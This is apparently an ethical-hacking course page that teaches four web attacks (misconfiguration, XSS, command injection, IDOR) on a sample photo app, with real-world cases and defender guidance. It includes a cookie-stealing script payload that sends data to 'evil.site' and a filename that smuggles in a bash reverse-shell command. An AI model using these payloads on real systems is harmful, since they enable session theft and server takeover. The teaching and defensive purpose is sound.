    Week 9 · Web Attacks I¶

    🧭 Application · CEH: Gaining Access (web) · attacking the layer your users actually touch — on one example app, PhotoViewer

    We're through the network and off the host. Now the application — the part users interact with, exposed to the whole internet by design, and the biggest target there is. One running example all week: PhotoViewer, a photo-sharing app.

    One idea to carry all week. A static site that just hands out pictures is almost nothing to attack. The moment the app takes input — a login, a search, a caption, a filename — and does something with it, you've created the attack surface. Every attack below abuses the trust the app places in input.

    The machine you're attacking

    PhotoViewer is three tiers: a web server (serves the page), an app server (the logic), and a data tier — a catalog database (who owns which photo, public or private, and where it's stored) plus the photo store itself. Walk one request:

    The four attacks — click to explore

    Each one abuses input the app should have checked. Pick an attack: you get the move, a live demo, and the real-world case.

    Security misconfiguration

    The store left open

    The code is fine — a setting was left loose. Step ④ handed Mary the storage URLs. If the store is public, she requests them directly and skips the app, reaching photos other users marked private.

    Same family: an /admin page on admin / admin, a database on its default password, verbose errors that leak the schema.

    Real world — Deep Root Analytics, 2017: a public cloud bucket exposed ~198 million US voter records. No exploit — just access left out.
    The JSON PhotoViewer returned
    "url": "store.photoapp.com/p/8842.jpg"
    ⚠ 200 OK — the store served the file with no check. Swap the number and you walk the whole store.
    Cross-site scripting

    A caption that runs

    A caption is supposed to be text — but PhotoViewer writes it straight into the page's HTML. Make the caption a <script>, and it runs in the next viewer's browser, with their session. The classic payload steals their cookie.

    Input was never sanitized; output was never encoded.

    Real world — TweetDeck, 2014: a script inside a post ran in the TweetDeck client (twitter.com stripped it) and self-spread as a worm across feeds.
    Mary's "caption" on photo 8842
    <script>fetch('evil.site/c='+document.cookie)</script>
    ⚠ Bob's browser ran Mary's script → Bob's session cookie was just sent to evil.site. Victim: another user.
    OS command injection

    Name the file a command

    To make a thumbnail, the server runs a real OS command and pastes your filename into it. But the filename is yours. Add a ; and a command of your own — the ; ends the resize and starts your command, and the shell runs both.

    It opens a shell back to you — now you're on the server.

    Real world — ImageMagick "ImageTragick", 2016 (CVE-2016-3714): a crafted uploaded image ran commands on any site that processed it.
    You upload a file named…
    vacation.jpg; bash -i >& /dev/tcp/attacker/4444 0>&1
    # the server runs:
    convert vacation.jpg; bash -i >&… -resize 200x200 thumb.jpg
    → reverse shell opened (nothing shown on the page)
    Broken access control (IDOR)

    Ask for what isn't yours

    The app checks you're logged in, but never that the photo is yours. Mary opens hers at ?id=123 — then just changes the number. Walk the ids and you pull everyone's private photos.

    The bug is the missing ownership check.

    Real world — First American, 2019: ~885 million mortgage files exposed by changing the number in a document URL.
    Try it — change the id
    photoapp.com/photos?id=123  
    🔓 Mary's photo — Foggy morning
    ✓ logged in as Mary  ·  the app never checked who owns photo 123.

    Every attack here is the same move: input the app trusted that it should have checked.

    The defender's view

    XSS & injection

    Sanitize input, encode output — a caption can't become a script, a filename can't become a command

    IDOR

    Check ownership on every object — logged-in is not the same as authorized

    Misconfiguration

    Lock the store, change defaults, patch — no public buckets, no admin/admin

    Behind it all

    A WAF and access-log monitoring catch the payloads a slip lets through
